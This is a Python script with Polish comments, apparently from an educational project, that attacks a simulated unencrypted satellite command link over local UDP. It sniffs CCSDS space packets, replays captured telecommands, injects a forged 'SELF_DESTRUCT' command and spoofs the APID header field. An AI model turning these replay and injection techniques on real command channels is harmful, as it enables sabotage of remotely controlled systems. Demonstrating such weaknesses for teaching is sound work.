"""
atak.py - atakujacy, ktory "slyszy" kanal radiowy (eter).

4 ataki z zalozen projektu:
  sniff   - podsluch: zapisuje wszystkie ramki lecace przez eter
  replay  - powtarza podsluchane komendy
  inject  - wysyla wlasna, falszywa komende
  spoof   - bierze podsluchana komende i podmienia w niej APID

Uzycie:
    python atak.py sniff
    python atak.py replay
    python atak.py inject
    python atak.py spoof --apid 0x20
"""
import argparse
import json
import socket

import config
import packet

CAPTURES = "captures.jsonl"                    # tu zapisujemy podsluchane ramki
ETHER = (config.HOST, config.ETHER_PORT)      # wszystko wysylamy przez eter


def show(frame: bytes) -> str:
    """Opis ramki - widac, ze bez szyfrowania wszystko jest jawne."""
    p, data, _ = packet.unpack(frame)
    kind = "TC" if p.packet_type == config.TC else "TM"
    return f"{kind} apid=0x{p.apid:03x} seq={p.seq_number} dane={data}"


def captured_commands() -> list[bytes]:
    """Wczytuje podsluchane ramki i zostawia tylko komendy (TC)."""
    with open(CAPTURES) as f:
        frames = [bytes.fromhex(json.loads(line)["hex"]) for line in f]
    return [fr for fr in frames if packet.unpack(fr)[0].packet_type == config.TC]


def send(frame: bytes, label: str):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(frame, ETHER)
    print(f"[atak] {label}: {show(frame)}")


# 1. PODSLUCH - eter wysyla nam kopie kazdej ramki na ATTACK_PORT
def sniff():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((config.HOST, config.ATTACK_PORT))
    sock.settimeout(0.5)  # zeby Ctrl+C dzialal na Windowsie
    print(f"[atak] podsluchuje port {config.ATTACK_PORT}, Ctrl+C konczy")
    with open(CAPTURES, "w") as out:
        try:
            while True:
                try:
                    frame, _ = sock.recvfrom(65535)
                except (socket.timeout, ConnectionResetError):
                    continue
                out.write(json.dumps({"hex": frame.hex()}) + "\n")
                out.flush()
                print(f"[atak] PODSLUCH: {show(frame)}")
        except KeyboardInterrupt:
            pass


# 2. REPLAY - wysylamy jeszcze raz dokladnie te same bajty
def replay():
    for frame in captured_commands():
        send(frame, "REPLAY")


# 3. INJECT - budujemy wlasna ramke CCSDS z falszywa komenda
def inject(data: str, seq: int):
    sp = packet.SpacePacket(config.TC, config.APID_TC, 0b11, seq)
    send(packet.pack(sp, data.encode()), "INJECT")


# 4. SPOOF - podmieniamy 11 bitow APID w naglowku podsluchanej komendy
def spoof(apid: int):
    for frame in captured_commands():
        ident = int.from_bytes(frame[0:2], "big")
        ident = (ident & ~0x7FF) | (apid & 0x7FF)
        send(ident.to_bytes(2, "big") + frame[2:], "SPOOF")


def main():
    ap = argparse.ArgumentParser(description="Atakujacy w kanale radiowym")
    ap.add_argument("atak", choices=["sniff", "replay", "inject", "spoof"])
    ap.add_argument("--data", default="SELF_DESTRUCT", help="tresc falszywej komendy (inject)")
    ap.add_argument("--seq", type=int, default=42, help="licznik sekwencji (inject)")
    ap.add_argument("--apid", type=lambda x: int(x, 0), default=0x20, help="nowy APID (spoof)")
    a = ap.parse_args()

    if a.atak == "sniff":
        sniff()
    elif a.atak == "replay":
        replay()
    elif a.atak == "inject":
        inject(a.data, a.seq)
    elif a.atak == "spoof":
        spoof(a.apid)


if __name__ == "__main__":
    main()
